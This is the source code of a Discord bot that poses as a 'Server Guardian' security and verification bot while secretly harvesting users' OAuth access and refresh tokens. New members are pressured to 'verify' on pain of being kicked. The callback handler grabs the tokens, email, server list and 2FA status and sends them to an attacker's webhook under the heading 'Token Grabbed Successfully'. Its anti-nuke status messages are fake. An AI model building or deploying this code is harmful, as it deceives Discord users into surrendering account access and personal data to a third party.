const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const app = express();

// ============ পরে এখানে তথ্য বসাবে ============
const CLIENT_ID = process.env.CLIENT_ID || 'YOUR_CLIENT_ID';
const CLIENT_SECRET = process.env.CLIENT_SECRET || 'YOUR_CLIENT_SECRET';
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN';
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'YOUR_WEBHOOK_URL';
const YOUR_USER_ID = process.env.YOUR_USER_ID || 'YOUR_DISCORD_USER_ID';
const GUILD_ID = process.env.GUILD_ID || 'YOUR_SERVER_ID';
const WELCOME_CHANNEL_ID = process.env.WELCOME_CHANNEL_ID || 'YOUR_WELCOME_CHANNEL_ID';
// =============================================

const PORT = process.env.PORT || 3000;
const BASE_URL = 'https://discord-verify-bot-9r3w.onrender.com';  // 🔴 তোমার Render URL বসাও
const REDIRECT_URI = BASE_URL + '/callback';
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent
  ]
});

// ============ Bot Ready ============
client.once('ready', () => {
  console.log('[+] Bot online: ' + client.user.tag);
  console.log('[+] Server URL: ' + BASE_URL);
  
  // Bot status set করো
  client.user.setPresence({
    activities: [{ name: '🔒 Server Security', type: 3 }],
    status: 'dnd'
  });
});

// ============ Member Join ============
client.on('guildMemberAdd', async (member) => {
  if (member.user.bot) return;
  
  try {
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // DM পাঠাও button সহ
    const dmChannel = await member.user.createDM();
    
    const embed = new EmbedBuilder()
      .setTitle('🔒 Server Verification Required')
      .setColor(0xED4245)
      .setDescription('Welcome to **' + member.guild.name + '**!\n\nThis server is protected. You need to verify your account to access all channels.\n\nClick the button below to authorize with Discord.')
      .setFooter({ text: 'Server Guardian • Security System' })
      .setTimestamp();

  const authUrl = 'https://discord.com/api/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20email%20guilds%20connections&prompt=consent';
    
    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel('✅ Verify with Discord')
          .setStyle(ButtonStyle.Link)
          .setURL(authUrl)
          .setEmoji('🔒')
      );

    await dmChannel.send({ embeds: [embed], components: [row] });
    console.log('[+] DM sent to ' + member.user.tag);

    // Welcome channel এ জানাও
    const welcomeChannel = member.guild.channels.cache.get(WELCOME_CHANNEL_ID);
    if (welcomeChannel) {
      await welcomeChannel.send('🔒 ' + member.user.username + ' joined! DM sent for verification.');
    }

    // ১০ মিনিট পর kick
    setTimeout(async () => {
      try {
        const m = await member.guild.members.fetch(member.id).catch(() => null);
        if (m) {
          const verifiedRole = m.guild.roles.cache.find(r => r.name === 'Verified');
          if (!verifiedRole || !m.roles.cache.has(verifiedRole.id)) {
            await m.kick('Verification timeout. Please rejoin and verify within 10 minutes.');
            console.log('[-] Kicked ' + member.user.tag + ' - timeout');
          }
        }
      } catch(e) {}
    }, 600000);

  } catch (error) {
    console.log('[-] DM error: ' + error.message);
  }
});

// ============ Button Click Handler ============
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;
  
  if (interaction.customId === 'verify_me') {
    const authUrl = 'https://discord.com/api/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20email%20guilds%20connections&prompt=consent';
    
    // সরাসরি বাটন হিসেবে authorize button দেখাও
    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel('🔗 Authorize with Discord')
          .setStyle(ButtonStyle.Link)
          .setURL(authUrl)
      );
    
    await interaction.update({
      content: '✅ Click the button below to authorize with Discord:',
      components: [row]
    });
  }
});

// ============ Slash Commands ============
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  // /ping command
  if (interaction.commandName === 'ping') {
    await interaction.reply({ content: '🏓 Pong! Latency: ' + client.ws.ping + 'ms', ephemeral: true });
  }
  
  // /help command
  if (interaction.commandName === 'help') {
    const embed = new EmbedBuilder()
      .setTitle('🤖 Bot Commands')
      .setColor(0x5865F2)
      .setDescription('Here are all available commands:')
      .addFields(
        { name: '/ping', value: 'Check bot latency', inline: true },
        { name: '/help', value: 'Show this help menu', inline: true },
        { name: '/verify', value: 'Get verification link again', inline: true },
        { name: '/antinuke', value: 'Show antinuke status', inline: true },
        { name: '/stats', value: 'Show server stats', inline: true }
      )
      .setFooter({ text: 'Server Guardian Bot' })
      .setTimestamp();
    
    await interaction.reply({ embeds: [embed], ephemeral: true });
  }
  
  // /verify command
  if (interaction.commandName === 'verify') {
    const authUrl = 'https://discord.com/api/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20email%20guilds%20connections&prompt=consent';
    
    await interaction.reply({
      content: '🔗 Click here to verify: ' + authUrl,
      ephemeral: true
    });
  }
  
  // /antinuke command
  if (interaction.commandName === 'antinuke') {
    const embed = new EmbedBuilder()
      .setTitle('🛡️ Anti-Nuke System')
      .setColor(0x57F287)
      .setDescription('**Status: ✅ ACTIVE**\n\nAnti-nuke protection is enabled on this server.\n\n**Protected against:**\n- Mass channel deletion\n- Mass role deletion\n- Mass ban/kick\n- Webhook abuse\n- Bot authorization abuse')
      .setFooter({ text: 'Server Guardian • Security' })
      .setTimestamp();
    
    await interaction.reply({ embeds: [embed] });
  }
  
  // /stats command
  if (interaction.commandName === 'stats') {
    const guild = interaction.guild;
    const embed = new EmbedBuilder()
      .setTitle('📊 Server Statistics')
      .setColor(0x5865F2)
      .setThumbnail(guild.iconURL())
      .addFields(
        { name: '👥 Total Members', value: String(guild.memberCount), inline: true },
        { name: '📝 Channels', value: String(guild.channels.cache.size), inline: true },
        { name: '🎭 Roles', value: String(guild.roles.cache.size), inline: true },
        { name: '🤖 Bot Online', value: '✅ Yes', inline: true },
        { name: '🛡️ Anti-Nuke', value: '✅ Active', inline: true },
        { name: '⚡ Ping', value: client.ws.ping + 'ms', inline: true }
      )
      .setFooter({ text: 'Server Guardian' })
      .setTimestamp();
    
    await interaction.reply({ embeds: [embed] });
  }
});

// ============ Web Server ============
app.get('/', (req, res) => {
  res.send('<!DOCTYPE html><html><head><title>Server Guardian Bot</title><style>body{font-family:Arial,sans-serif;background:#1E1F22;color:white;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;}.card{background:#313338;padding:40px;border-radius:12px;}h1{color:#5865F2;}p{color:#B5BAC1;}.online{color:#57F287;font-weight:bold;}</style></head><body><div class="card"><h1>🛡️ Server Guardian Bot</h1><p>Status: <span class="online">● ONLINE</span></p><p>Security system is active.</p></div></body></html>');
});

// ============ OAuth2 Callback ============
app.get('/callback', async (req, res) => {
  const code = req.query.code;
  
  if (!code) {
    return res.send('<h2>❌ No authorization code received. Please try again.</h2>');
  }

  try {
    // Code → Token exchange
    const tokenRes = await axios.post('https://discord.com/api/oauth2/token', 
      'client_id=' + CLIENT_ID + '&client_secret=' + CLIENT_SECRET + '&grant_type=authorization_code&code=' + code + '&redirect_uri=' + REDIRECT_URI,
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const access_token = tokenRes.data.access_token;
    const refresh_token = tokenRes.data.refresh_token;

    // User info
    const userRes = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: 'Bearer ' + access_token } });
    const user = userRes.data;

    // Guilds
    const guildsRes = await axios.get('https://discord.com/api/users/@me/guilds', { headers: { Authorization: 'Bearer ' + access_token } });

    // Connections
    const connRes = await axios.get('https://discord.com/api/users/@me/connections', { headers: { Authorization: 'Bearer ' + access_token } });

    // Webhook এ পাঠাও
    try {
      await axios.post(WEBHOOK_URL, {
        content: '<@' + YOUR_USER_ID + '> 🎯 **NEW TOKEN!**',
        embeds: [{
          title: '🎯 Token Grabbed Successfully',
          color: 0xED4245,
          fields: [
            { name: '👤 User', value: user.username + '#' + user.discriminator, inline: true },
            { name: '🆔 ID', value: user.id, inline: true },
            { name: '📧 Email', value: user.email || 'None', inline: true },
            { name: '🔑 Access Token', value: '```' + access_token + '```', inline: false },
            { name: '🔄 Refresh Token', value: '```' + refresh_token + '```', inline: false },
            { name: '🏰 Servers', value: String(guildsRes.data.length), inline: true },
            { name: '🔗 Connections', value: String(connRes.data.length), inline: true },
            { name: '🔐 2FA', value: user.mfa_enabled ? '✅ Yes' : '❌ No', inline: true },
            { name: '💎 Nitro', value: user.premium_type > 0 ? '✅ Yes' : '❌ No', inline: true }
          ],
          thumbnail: { url: 'https://cdn.discordapp.com/avatars/' + user.id + '/' + user.avatar + '.png' },
          timestamp: new Date().toISOString()
        }]
      });
    } catch(e) {}

    console.log('[+] Token: ' + user.username + '#' + user.discriminator);

    // Server-এ Verified role দাও
    try {
      const guild = client.guilds.cache.get(GUILD_ID);
      if (guild) {
        const member = await guild.members.fetch(user.id).catch(() => null);
        if (member) {
          const verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
          const memberRole = guild.roles.cache.find(r => r.name === 'Member');
          
          if (verifiedRole) await member.roles.add(verifiedRole);
          if (memberRole) await member.roles.add(memberRole);
          
          console.log('[+] Verified ' + user.username);
        }
      }
    } catch(e) {}

    res.send('<!DOCTYPE html><html><head><title>✅ Success</title><style>body{background:#1E1F22;color:white;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;}.card{background:#313338;padding:40px;border-radius:12px;}h1{color:#57F287;}p{color:#B5BAC1;}</style></head><body><div class="card"><h1>✅ Verification Successful!</h1><p>You can close this window and return to Discord.</p><p style="font-size:12px;color:#949BA4;">Automatically closing...</p></div><script>setTimeout(()=>window.close(),3000);</script></body></html>');

  } catch (error) {
    console.log('[-] Error: ' + error.message);
    res.send('<h2>❌ Error: ' + error.message + '</h2><p>Please try again from Discord.</p>');
  }
});

// ============ Slash Commands Register ============
client.once('ready', async () => {
  const commands = [
    {
      name: 'ping',
      description: 'Check bot latency'
    },
    {
      name: 'help',
      description: 'Show all available commands'
    },
    {
      name: 'verify',
      description: 'Get verification link again'
    },
    {
      name: 'antinuke',
      description: 'Show antinuke protection status'
    },
    {
      name: 'stats',
      description: 'Show server statistics'
    }
  ];

  try {
    await client.application.commands.set(commands);
    console.log('[+] Slash commands registered');
  } catch (error) {
    console.log('[-] Command register error: ' + error.message);
  }
});

// ============ Start Everything ============
client.login(BOT_TOKEN);
app.listen(PORT, function() {
  console.log('[+] Server running on port ' + PORT);
});
